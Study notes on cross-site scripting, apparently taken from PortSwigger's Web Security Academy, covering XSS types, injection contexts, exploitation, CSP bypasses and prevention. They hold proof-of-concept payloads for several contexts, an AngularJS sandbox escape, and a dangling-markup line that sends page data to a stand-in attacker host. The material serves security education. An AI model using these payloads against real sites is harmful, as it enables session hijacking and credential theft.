# Cross-Site Scripting (XSS) Notes
Source topic: PortSwigger Web Security Academy → Client-side topics → Cross-site scripting
https://portswigger.net/web-security/cross-site-scripting

---

## 1. What is XSS?

XSS lets an attacker make a vulnerable site return **malicious JavaScript** to a victim's browser.
Because the script runs in the victim's browser, in the context of their session, it can:

- Impersonate/masquerade as the victim
- Perform any action the victim can perform
- Read any data the victim can access
- Capture login credentials
- Deface the site
- Plant trojan functionality

Impact depends on the app: minimal on anonymous brochureware, serious on apps with sensitive
data, **critical** if the compromised user has elevated privileges.

## 2. The three types

### Reflected XSS
Data from the **current HTTP request** is echoed back into the response unsafely.

```
https://insecure-website.com/status?message=All+is+well.
→ <p>Status: All is well.</p>
```

Attack:
```
https://insecure-website.com/status?message=<script>/* bad stuff */</script>
```
Victim must be tricked into clicking a crafted link (delivered via phishing, the lab's
"exploit server", etc.). Not persistent, only affects the user who makes the request.

### Stored XSS (persistent / second-order)
Malicious data is **saved server-side** (comments, nicknames, order details, chat, etc.) and
later served to other users unsafely.

```html
<p>Hello, this is my message!</p>
<!-- becomes -->
<p><script>/* bad stuff */</script></p>
```
More dangerous than reflected: every visitor who views the stored content is hit, no phishing
link required.

### DOM-based XSS
The vulnerability is entirely in **client-side JavaScript** — data from an untrusted "source"
flows to a dangerous "sink" without proper handling, and the server response itself may be
completely unchanged/safe.

```js
var search = document.getElementById('search').value;
document.getElementById('results').innerHTML = 'You searched for: ' + search;
```
If `search` is attacker-controlled (e.g. via URL query string), they can inject
`<img src=1 onerror=alert(1)>`.

**Common sources:** `location.search`, `location.hash`, `document.URL`, `document.referrer`,
`window.name`, `document.cookie`, web messages (`postMessage`).

**Common sinks (HTML):** `document.write()`, `.innerHTML`, `.outerHTML`, `jQuery.html()`.
**Common sinks (JS execution):** `eval()`, `setTimeout()`/`setInterval()` (string arg),
`Function()`, `<script src>` element `src`, `location`, `location.href`, `element.src`.

DOM Invader (Burp's browser extension, free with Burp Community) is the recommended tool for
finding these — it auto-detects sources/sinks and offers canary payloads.

## 3. XSS contexts (where your payload lands controls how you must break out)

| Context | Example | Escape technique |
|---|---|---|
| Between HTML tags | `<p>HERE</p>` | Inject a new tag: `<script>...</script>` |
| Inside a tag attribute | `<input value="HERE">` | Close the attribute/tag: `"><script>...</script>` |
| Inside a `<script>` block, as data | `var x = 'HERE';` | Break out of the string: `';alert(1)//` |
| Inside a JS template literal | `` `Hello ${HERE}` `` | Use `${...}`: `${alert(1)}` |
| Inside an HTML-encoded attribute | angle brackets encoded but quotes aren't | Use an event handler instead of a new tag: `" onmouseover="alert(1)` |
| Client-side template injection (AngularJS) | `{{HERE}}` rendered inside `ng-app` | AngularJS sandbox escape expressions |

Key idea: identify **exactly** what characters are/aren't encoded at your reflection point,
then choose the minimal payload that survives.

## 4. Client-side template injection (AngularJS sandbox)

Old AngularJS (<1.6) evaluates `{{ }}` expressions and sandboxes them. Classic sandbox-escape
payload (works pre-1.6, no strings needed, useful when quotes are blocked):

```
{{constructor.constructor('alert(1)')()}}
```

## 5. Exploiting XSS — what attackers actually do with it

- **Steal cookies** → `document.cookie` exfiltrated to attacker-controlled domain, session
  hijack via cookie replacement (works if cookie lacks `HttpOnly`).
- **Capture credentials** → inject a fake login form / keylogger that POSTs to attacker server.
- **Bypass CSRF protection** → XSS lets you read the page (and any CSRF token in it), so you
  can build and submit a state-changing request as the victim, sidestepping token defenses.

## 6. Dangling markup injection

Used when full script execution is blocked but you can still inject HTML. You inject an
**unclosed** tag/attribute so the browser keeps consuming subsequent page content (including
sensitive data like a CSRF token) as part of that attribute's value, then send it cross-domain:

```html
<img src="https://attacker.net/log?
```
Everything up to the next `"` in the real page gets appended to the URL and requested from
the attacker's server. No JavaScript execution needed, this is why it can bypass CSP.

## 7. Content Security Policy (CSP)

A response header (`Content-Security-Policy`) that restricts which script sources/inline
scripts the browser will execute, as defense-in-depth against XSS.

- Can often be bypassed via: JSONP endpoints allow-listed by the policy, whitelisted CDN
  paths hosting exploitable libraries, `unsafe-inline`/`unsafe-eval` if present, policy
  injection via a reflected response header, or dangling markup (CSP doesn't stop plain
  HTML injection, only script execution).

## 8. Preventing XSS (for when you're defending, not attacking)

1. **Filter input on arrival** — validate against an allow-list of expected characters/format.
2. **Encode output** — HTML-encode data written into HTML bodies/attributes; JS-encode data
   written into script contexts; URL-encode data written into URLs.
3. **Use correct response headers** — `Content-Type` + `X-Content-Type-Options: nosniff` so
   browsers don't MIME-sniff a response into HTML.
4. **CSP as a last line of defense.**
5. Prefer frameworks/template engines that auto-escape by context (React, Angular 2+, modern
   templating engines) over hand-rolled string concatenation.

## 9. Confirming a hit: `alert()` vs `print()`

`alert()` is the traditional PoC because it's short and unmistakable. Since Chrome 92
(20 Jul 2021), **cross-origin iframes can no longer call `alert()`**. For attacks built inside
a cross-origin iframe, use `print()` instead. PortSwigger labs accept either where relevant.

